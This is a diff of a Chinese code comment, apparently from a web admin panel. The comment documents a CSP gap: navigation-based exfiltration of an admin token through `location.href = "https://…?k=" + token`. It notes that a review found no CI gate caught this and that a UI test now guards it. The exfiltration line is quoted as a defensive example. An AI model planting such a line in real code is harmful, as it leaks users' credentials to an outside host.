@@ -10,9 +10,9 @@
  * `form-action 'none'` 挡得住表单外传，**但挡不住 `location.href = "https://…?k=" + token`
  * 这种导航式外传**——CSP 已经没有可用的指令拦它（`navigate-to` 被规范移除了）。
  * 真正的解法是服务端签发可撤销的派生令牌，那要动「ADMIN_TOKEN 只从环境变量读」
- * 这条设计约束，登记 P3c。这段话同时写进了五语言 DEPLOY.md，不只留在注释里。
+ * 这条设计约束，已另行登记、本期不做。这段话同时写进了五语言 DEPLOY.md，不只留在注释里。
  * ⚠️⚠️ **上面这句话曾经只是一句话，没有任何机器盯着它点名的那一族**
- *（P3d 全分支评审 F-3，实测：往 `js/sec-playground.js` 里插一行
+ *（评审当场实测：往 `js/sec-playground.js` 里插一行
  * `location.href = "https://…?k=" + token`，走完「改文件 → build-ui → 跑全量」之后
  * **十二道门禁一道都不吵**）。⇒ 现在由 `tests/ui/api-session.test.ts` 的
  * 「面板的导航出口清单（CSP 拦不住的那一族）」那一组盯着。
